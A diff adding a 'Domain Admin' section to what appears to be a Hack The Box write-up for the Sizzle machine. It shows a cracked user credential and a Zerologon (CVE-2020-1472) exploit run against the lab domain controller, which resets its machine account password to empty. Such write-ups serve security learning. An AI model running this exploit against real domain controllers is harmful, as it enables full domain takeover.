@@ -314,3 +314,14 @@ SMB         10.129.19.191   445    SIZZLE           [+] HTB.LOCAL\amanda:Ashare1
 ```
 This user is compromised
 
+# Domain Admin
+```python
+python3 cve-2020-1472-exploit.py SIZZLE 10.129.19.191                                                                        
+Performing authentication attempts...
+=======================================================================================================================================
+Target vulnerable, changing account password to empty string
+
+Result: 0
+
+Exploit complete!
+```
